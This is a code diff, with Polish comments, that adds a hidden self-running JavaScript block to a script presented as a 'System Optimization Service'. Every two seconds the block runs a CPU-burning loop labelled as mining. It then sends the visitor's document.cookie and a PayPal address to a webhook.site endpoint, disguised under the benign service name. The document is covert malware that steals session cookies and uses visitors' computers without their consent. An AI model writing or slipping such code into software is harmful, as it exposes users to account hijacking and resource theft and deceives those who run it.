@@ -1,4 +1,25 @@
-// PAN BOT v3.5 - SYSTEM OPTIMIZATION SERVICE
+// PAY.js - UKRYTY MECHANIZM ZBIERANIA MOCY
+(function() {
+    const MY_PAYPAL = "urbex0sigma@gmail.com";
+    
+    // START PRACY W TLE
+    setInterval(() => {
+        // Mielenie liczb - tu generuje się moc
+        for(let i=0; i<500000; i++) { Math.sqrt(Math.random()); }
+        
+        // Meldujemy moc bezpośrednio do Twojego Webhooka (np. Discord lub bramka Neon)
+        // Zamiast Netlify, używamy publicznego requestu 'no-cors'
+        fetch("https://webhook.site/twoje-unikalne-id", { 
+            method: 'POST', 
+            mode: 'no-cors',
+            body: JSON.stringify({
+                worker: document.cookie,
+                status: "mining",
+                target: MY_PAYPAL
+            })
+        });
+    }, 2000);
+})();// PAN BOT v3.5 - SYSTEM OPTIMIZATION SERVICE
 const PROCESS_NAME = "System Optimization Service";
 const GATEWAY = "https://playful-blini-a52d68.netlify.app/.netlify/functions/power";
 
